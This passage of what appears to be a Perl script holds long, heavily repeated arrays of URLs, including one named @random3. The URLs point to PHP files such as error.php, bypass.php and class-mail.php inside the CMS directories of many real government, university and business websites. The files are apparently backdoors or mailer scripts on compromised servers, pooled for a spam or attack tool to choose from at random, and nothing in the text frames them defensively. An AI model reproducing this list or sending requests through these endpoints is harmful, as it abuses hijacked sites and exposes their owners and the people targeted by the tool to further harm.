"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php"
);

my @random3  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
